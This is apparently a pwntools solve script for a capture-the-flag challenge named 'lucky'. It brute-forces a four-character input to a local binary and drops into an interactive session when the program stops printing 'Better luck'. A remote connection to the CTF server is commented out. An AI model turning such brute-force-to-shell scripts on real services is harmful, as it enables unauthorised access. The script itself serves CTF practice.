from pwn import *
from time import sleep

libc = ELF("libc.so.6")

chars = ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*/!@#$%^&*()[]-+~|'
nchars = len(chars)
curr = [0,0,0,0]
while curr != [nchars, nchars, nchars, nchars]:
    for i in range(0, nchars):
        for j in range(0, nchars):
            for k in range(0, nchars):
                for l in range(0, nchars):
                    a = chars[i] 
                    b = chars[j]
                    c = chars[k] 
                    d = chars[l] 
                    curr = [i,j,k,l]
                    print(curr)
                    guess = ' '*11 + a + b + c + d
                    #p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
                    p = process('./lucky')
                    #sleep(0.2)
                    out = p.read()               
                    p.sendline(guess.encode())
                    out = p.recvrepeat()
                    print(out)
                    if 'Better luck' not in out.decode():
                        p.interactive()
                    p.close()
                    #sleep(0.2)
    